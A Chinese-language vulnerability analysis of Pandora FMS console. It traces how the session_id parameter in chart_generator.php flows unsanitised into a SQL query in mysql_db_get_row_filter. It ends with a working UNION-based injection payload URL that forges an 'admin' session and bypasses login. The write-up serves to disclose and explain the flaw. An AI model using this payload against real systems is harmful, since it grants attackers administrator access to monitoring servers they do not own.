## 漏洞产生原因

`include/chart_generator.php`中的`user = new PandoraFMS\User(['phpsessionid' => $_REQUEST['session_id']]);`直接使用了用户输入的数据

`include/lib/User.php`

```php
public function __construct($data) {
    global $config;
    // Unset user.
    unset($config['id_usuario']);
    unset($_SESSION['id_usuario']);
    if (is_array($data) === true) {
        if (isset($data['phpsessionid']) === true) {
            $this->sessions[$data['phpsessionid']] = 1;
            $info = db_get_row_filter('tsessions_php', ['id_session' => $data['phpsessionid']]);
            if ($info !== false) {
                // Process.
                $session_data = session_decode($info['data']);
                $this->idUser = $_SESSION['id_usuario'];
                // Valid session.
                return $this;
            }
            return null;
        }
        if (isset($data['id_usuario']) === true && isset($data['password']) === true) {
            $user_in_db = process_user_login($user, $password, true);
            if ($user_in_db !== false) {
                $config['id_usuario'] = $user_in_db;
                $correctLogin = true;
                // Originally at api.php.
                if (session_status() === PHP_SESSION_NONE) {
                    session_start();
                }
                $_SESSION['id_usuario'] = $user;
                session_write_close();
                $this->idUser = $data['id_usuario'];
                // Valid session.
                return $this;
            }
        }
    }
    return null;
}
```

`include/db/mysql.php`直接将`$filter`即`$_REQUEST['session_id']`进行数据分拆后拼接到sql语句中`$sql = sprintf('SELECT %s FROM %s %s', $fields, $table, $filter);`

```php
function mysql_db_get_row_filter($table, $filter, $fields=false, $where_join='AND', $historydb=false)
{
    if (empty($fields)) {
        $fields = '*';
    } else {
        if (is_array($fields)) {
            $fields = implode(',', $fields);
        } else if (! is_string($fields)) {
            return false;
        }
    }

    if (is_array($filter)) {
        $filter = db_format_array_where_clause_sql($filter, $where_join, ' WHERE ');
    } else if (is_string($filter)) {
        $filter = 'WHERE '.$filter;
    } else {
        $filter = '';
    }

    $sql = sprintf('SELECT %s FROM %s %s', $fields, $table, $filter);

    return db_get_row_sql($sql, $historydb);
}
```

利用这个sql注入漏洞,可以返回伪造的数据,进而在`session_decode`后伪造`$_SERSSION`变量并用于假冒用户登录

```php
if ($info !== false) {
    // Process.
    $session_data = session_decode($info['data']);
    $this->idUser = $_SESSION['id_usuario'];
    // Valid session.
    return $this;
}
```

[pandora_console/pandoradb.sql](https://github.com/pandorafms/pandorafms/blob/953aa2887c53e6348276844ec63c25a4f8420571/pandora_console/pandoradb.sql)

```sql
CREATE TABLE IF NOT EXISTS `tsessions_php` (
  `id_session` CHAR(52) NOT NULL,
  `last_active` INT NOT NULL,
  `data` TEXT,
  PRIMARY KEY (`id_session`)
)ENGINE=InnoDB DEFAULT CHARSET=UTF8MB4;
```

payload

```
pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data--+
```